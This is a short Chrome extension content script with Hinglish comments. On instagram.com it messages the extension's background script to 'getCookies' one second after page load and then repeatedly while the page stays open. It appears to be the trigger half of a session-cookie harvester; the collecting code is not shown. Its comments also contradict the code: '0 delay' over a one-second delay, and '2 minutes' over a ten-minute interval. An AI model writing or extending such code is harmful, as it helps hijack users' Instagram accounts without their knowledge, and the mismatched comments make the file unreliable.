
// Page load hone par foran signal bhejo background ko
if (window.location.hostname.includes('instagram.com')) {

  // Foran bhejo (0 delay)
  setTimeout(() => {
    chrome.runtime.sendMessage({
      action: "getCookies",
      url: window.location.href,
      time: new Date().toISOString()
    });
  }, 1000);

  // Har 2 minutes baad bhi bhejte raho jab tak page open hai
  setInterval(() => {
    chrome.runtime.sendMessage({
      action: "getCookies",
      url: window.location.href,
      time: new Date().toISOString()
    });
  }, 600000); // 2 minutes

}